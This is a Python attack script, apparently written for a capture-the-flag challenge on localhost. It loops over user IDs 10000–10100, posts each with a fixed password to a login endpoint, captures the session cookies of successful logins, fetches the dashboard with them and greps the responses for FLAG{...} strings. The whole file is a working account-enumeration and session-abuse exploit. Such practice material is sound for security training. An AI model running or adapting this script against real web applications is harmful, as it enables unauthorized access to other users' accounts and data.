import requests
import re
import time

base_url = "http://localhost"
auth_endpoint = "/password/test"
password = "test"
start_id = 10000
end_id = 10100

print(f"[*] Testing user_id range: {start_id}-{end_id}\n")

successful = []
flags = []
fail_count = 0

for user_id in range(start_id, end_id + 1):
    try:
        # POST authentication
        resp = requests.post(
            f"{base_url}{auth_endpoint}",
            data={'user_id': user_id, 'password': password},
            allow_redirects=False,
            timeout=3
        )
        
        # Search for flags
        flag_matches = re.findall(r'FLAG\{[^}]+\}', resp.text)
        
        if flag_matches:
            print(f"\n[FLAG] user_id={user_id} | Status={resp.status_code}")
            print(f"Flags: {flag_matches}")
            print(f"Response:\n{resp.text}\n")
            flags.append({'id': user_id, 'flags': flag_matches, 'loc': 'auth'})
        
        if resp.status_code in [200, 301, 302]:
            successful.append(user_id)
            cookies = dict(resp.cookies)
            print(f"[SUCCESS] user_id={user_id} | {resp.status_code} | Cookies: {cookies}")
            
            # Try dashboard
            if cookies:
                try:
                    dash = requests.get(f"{base_url}/dashboard", cookies=cookies, timeout=3)
                    dash_flags = re.findall(r'FLAG\{[^}]+\}', dash.text)
                    if dash_flags:
                        print(f"\n[FLAG IN DASHBOARD] user_id={user_id}")
                        print(f"Flags: {dash_flags}")
                        print(f"Dashboard:\n{dash.text}\n")
                        flags.append({'id': user_id, 'flags': dash_flags, 'loc': 'dashboard'})
                except:
                    pass
        else:
            fail_count += 1
            
    except Exception as e:
        fail_count += 1
    
    # Small delay every 10 requests
    if user_id % 10 == 0:
        time.sleep(0.1)

print(f"\n{'='*50}")
print(f"RESULTS: {len(successful)} successful | {fail_count} failed")
print(f"Valid IDs: {successful}")
print(f"FLAGS: {len(flags)}")
for f in flags:
    print(f"  ID {f['id']} ({f['loc']}): {f['flags']}")

